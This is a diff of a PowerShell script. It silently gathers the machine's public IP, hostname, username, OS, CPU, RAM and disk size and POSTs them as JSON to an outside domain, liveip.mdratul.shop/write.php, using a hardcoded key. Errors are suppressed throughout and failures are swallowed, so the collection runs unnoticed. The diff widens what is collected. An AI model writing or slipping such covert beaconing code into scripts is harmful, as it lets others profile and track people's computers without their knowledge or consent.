@@ -10,25 +10,24 @@ $ErrorActionPreference = 'SilentlyContinue'
 
 try {
     $publicIP = (Invoke-RestMethod -Uri "https://api.ipify.org" -ErrorAction SilentlyContinue).ToString()
-
+    $cpu = (Get-CimInstance Win32_Processor).Name -replace '\s+', ' '
+    $ram = "$([math]::Round((Get-CimInstance Win32_PhysicalMemory | Measure-Object Capacity -Sum).Sum / 1GB))GB"
+    $disk = "$([math]::Round((Get-CimInstance Win32_LogicalDisk | Where-Object DeviceID -eq "C:").Size / 1GB))GB"
+    
     $data = @{
         time = (Get-Date -Format "yyyy-MM-dd HH:mm:ss")
         ip = $publicIP
         hostname = $env:COMPUTERNAME
         user = $env:USERNAME
-        os = (Get-CimInstance Win32_OperatingSystem -ErrorAction SilentlyContinue).Caption
+        os = (Get-CimInstance Win32_OperatingSystem).Caption
+        cpu = $cpu
+        ram = $ram
+        disk = $disk
     } | ConvertTo-Json -Compress
 
-    # Updated to use your new Cloudflare domain and HTTPS
     Invoke-RestMethod -Uri "https://liveip.mdratul.shop/write.php?key=chomolokko" `
-        -Method POST `
-        -Body $data `
-        -ContentType "application/json" `
-        -ErrorAction SilentlyContinue | Out-Null
-
-} catch {
-    # Do nothing (silent failure)
-}
+        -Method POST -Body $data -ContentType "application/json" -ErrorAction SilentlyContinue | Out-Null
+} catch {}
 
 
 # =========================================
